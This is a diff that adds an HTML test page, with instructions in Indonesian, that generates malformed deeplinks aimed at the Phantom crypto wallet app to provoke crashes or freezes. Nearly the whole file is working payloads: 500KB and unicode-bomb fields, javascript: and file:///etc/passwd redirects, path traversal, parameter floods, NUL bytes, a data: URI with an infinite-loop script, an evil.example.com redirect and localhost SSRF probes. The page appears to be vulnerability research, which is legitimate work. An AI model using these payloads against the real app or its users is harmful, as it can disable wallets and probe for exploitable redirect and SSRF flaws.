@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>B1 Deeplink DoS</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; max-width: 720px; margin: 0 auto; padding: 16px; background:#0d0d10; color:#e6e6e6; line-height:1.5; }
+    h1 { color:#a78bfa; font-size:20px; }
+    h2 { color:#f0abfc; font-size:15px; margin-top:18px; }
+    a.btn { display:block; width:100%; padding:12px; background:#1f1f25; border:1px solid #2f2f37; color:#a5f3fc; border-radius:8px; font-size:14px; margin: 6px 0; text-decoration:none; word-break:break-all; }
+    .warn { background:#3f1d1d; border:1px solid #ef4444; padding:10px; border-radius:6px; color:#fecaca; font-size:13px; }
+    .desc { font-size:12px; color:#9ca3af; margin: 2px 0 8px 4px; }
+    .urlpreview { background:#0a0a0c; border:1px solid #2f2f37; padding:6px 8px; border-radius:4px; color:#fde047; font-size:11px; margin-top:4px; word-break:break-all; max-height:60px; overflow:hidden; }
+  </style>
+</head>
+<body>
+  <h1>B1 — Malformed Deeplink DoS</h1>
+  <div class="warn">
+    Klik tiap link → akan mencoba buka Phantom dengan payload aneh.<br>
+    <b>Observe</b>: app crash? freeze? error message? splash screen stuck? CPU panas?<br>
+    Setelah test → <b>force-quit Phantom</b> (swipe up) sebelum lanjut ke test berikutnya.
+  </div>
+
+  <h2>Universal links (https://phantom.app/ul/...)</h2>
+  <div id="ul"></div>
+
+  <h2>Custom scheme (phantom://)</h2>
+  <div id="ph"></div>
+
+  <h2>Browse deeplink (Phantom in-app browser)</h2>
+  <div id="br"></div>
+
+  <script>
+  function $(id) { return document.getElementById(id); }
+  function row(parent, label, url, desc) {
+    const a = document.createElement('a');
+    a.className = 'btn';
+    a.href = url;
+    a.innerHTML = "<b>" + label + "</b><br><span class='desc'>" + desc + "</span><div class='urlpreview'>" + url.slice(0, 200) + (url.length>200?"…("+url.length+" bytes)":"") + "</div>";
+    $(parent).appendChild(a);
+  }
+
+  const HUGE = "A".repeat(50_000);
+  const HUGER = "A".repeat(500_000);
+  const RTL = "‮".repeat(100);
+  const NULL = "%00".repeat(50);
+  const UNICODE_BOMB = encodeURIComponent("é".repeat(10000));
+  const COMBINING = encodeURIComponent("a" + "́".repeat(5000));
+
+  // ---- universal link variants ----
+  const ulBase = "https://phantom.app/ul/v1/";
+
+  row('ul', "1) connect with no params",        ulBase + "connect", "Empty connect — should error nicely.");
+  row('ul', "2) connect dengan dapp_encryption_public_key invalid base58", ulBase + "connect?dapp_encryption_public_key=NOT_BASE58!!!&app_url=https%3A%2F%2Fevil.example.com&redirect_link=https%3A%2F%2Fevil.example.com&cluster=mainnet-beta", "Malformed pubkey field.");
+  row('ul', "3) connect dengan dapp_encryption_public_key 1MB",  ulBase + "connect?dapp_encryption_public_key=" + HUGER.slice(0, 1_000_000) + "&app_url=https%3A%2F%2Fx&redirect_link=https%3A%2F%2Fx", "1MB junk in field — parser DoS?");
+  row('ul', "4) connect dengan app_url javascript:",        ulBase + "connect?dapp_encryption_public_key=11111111111111111111111111111111&app_url=javascript%3Aalert(1)&redirect_link=javascript%3Aalert(2)&cluster=mainnet-beta", "javascript: scheme in app_url.");
+  row('ul', "5) connect dengan redirect_link file://",      ulBase + "connect?dapp_encryption_public_key=11111111111111111111111111111111&app_url=https%3A%2F%2Fx&redirect_link=file%3A%2F%2F%2Fetc%2Fpasswd&cluster=mainnet-beta", "file:// redirect.");
+  row('ul', "6) connect dengan cluster aneh",               ulBase + "connect?dapp_encryption_public_key=11111111111111111111111111111111&app_url=https%3A%2F%2Fx&redirect_link=https%3A%2F%2Fx&cluster=" + encodeURIComponent("../../../etc/passwd"), "Path traversal di cluster?");
+  row('ul', "7) connect dengan ribuan duplicate params",    ulBase + "connect?" + Array(500).fill("cluster=mainnet-beta").join("&"), "Param pollution.");
+  row('ul', "8) connect dengan unicode bomb di app_url",    ulBase + "connect?dapp_encryption_public_key=11111111111111111111111111111111&app_url=" + UNICODE_BOMB + "&redirect_link=https%3A%2F%2Fx&cluster=mainnet-beta", "Unicode bomb.");
+  row('ul', "9) signMessage dengan payload 500KB",          ulBase + "signMessage?dapp_encryption_public_key=11111111111111111111111111111111&nonce=11111111111111111111111111111111&redirect_link=https%3A%2F%2Fx&payload=" + HUGER, "Huge payload field.");
+  row('ul', "10) signTransaction dengan combining char bomb", ulBase + "signTransaction?dapp_encryption_public_key=11111111111111111111111111111111&nonce=11111111111111111111111111111111&redirect_link=https%3A%2F%2Fx&payload=" + COMBINING, "Combining diacritics.");
+  row('ul', "11) endpoint tidak dikenal",                    ulBase + "doesNotExist?foo=bar", "Unknown endpoint.");
+  row('ul', "12) endpoint dengan path traversal",            ulBase + "../../v1/connect?dapp_encryption_public_key=x", "Path traversal.");
+  row('ul', "13) trailing fragment huge",                    ulBase + "connect#" + HUGER, "Fragment 500KB.");
+  row('ul', "14) RTL override di endpoint",                  ulBase + RTL + "connect", "RTL bomb di path.");
+  row('ul', "15) NUL bytes di path",                          ulBase + "connect" + NULL, "URL-encoded NUL bytes.");
+
+  // ---- custom scheme variants ----
+  const phBase = "phantom://";
+  row('ph', "1) phantom://",                                  phBase, "Bare scheme.");
+  row('ph', "2) phantom:// with HUGE host",                    phBase + HUGER, "500KB host.");
+  row('ph', "3) phantom://browse?url=javascript:alert(1)",     phBase + "browse?url=" + encodeURIComponent("javascript:alert(1)"), "JS scheme in browse.");
+  row('ph', "4) phantom://v1/connect?...",                     phBase + "v1/connect?dapp_encryption_public_key=11111111111111111111111111111111&app_url=https%3A%2F%2Fx&redirect_link=https%3A%2F%2Fx&cluster=mainnet-beta", "Mirror UL via custom scheme.");
+  row('ph', "5) phantom://signTransaction with payload 500KB", phBase + "v1/signTransaction?dapp_encryption_public_key=11111111111111111111111111111111&nonce=11111111111111111111111111111111&redirect_link=https%3A%2F%2Fx&payload=" + HUGER, "Huge payload, custom scheme.");
+  row('ph', "6) phantom://?" + "a=b&".repeat(2000) + "x=y",     phBase + "?" + "a=b&".repeat(2000) + "x=y", "Param flood.");
+  row('ph', "7) phantom://%00%00%00",                           phBase + "%00%00%00", "NUL byte host.");
+
+  // ---- browse deeplink ----
+  row('br', "1) browse ke data: URI",         "https://phantom.app/ul/browse/" + encodeURIComponent("data:text/html,<script>while(1){}</script>") + "?ref=" + encodeURIComponent("https://x"), "data: URI bomb (infinite loop). EXPECT app freeze if Phantom in-app browser tidak handle data: dengan baik.");
+  row('br', "2) browse ke very deep redirect", "https://phantom.app/ul/browse/" + encodeURIComponent("https://httpbin.org/redirect/100") + "?ref=" + encodeURIComponent("https://x"), "100 redirects.");
+  row('br', "3) browse ke chrome://",          "https://phantom.app/ul/browse/" + encodeURIComponent("chrome://settings") + "?ref=" + encodeURIComponent("https://x"), "Internal scheme.");
+  row('br', "4) browse ke about:blank dgn fragment 500KB", "https://phantom.app/ul/browse/" + encodeURIComponent("about:blank#" + HUGER) + "?ref=" + encodeURIComponent("https://x"), "Huge fragment in about:.");
+  row('br', "5) browse ke localhost",          "https://phantom.app/ul/browse/" + encodeURIComponent("http://127.0.0.1:8080/") + "?ref=" + encodeURIComponent("https://x"), "Internal SSRF angle.");
+  row('br', "6) browse url 500KB",             "https://phantom.app/ul/browse/" + encodeURIComponent("https://example.com/?" + HUGER) + "?ref=" + encodeURIComponent("https://x"), "Massive URL.");
+  </script>
+</body>
+</html>
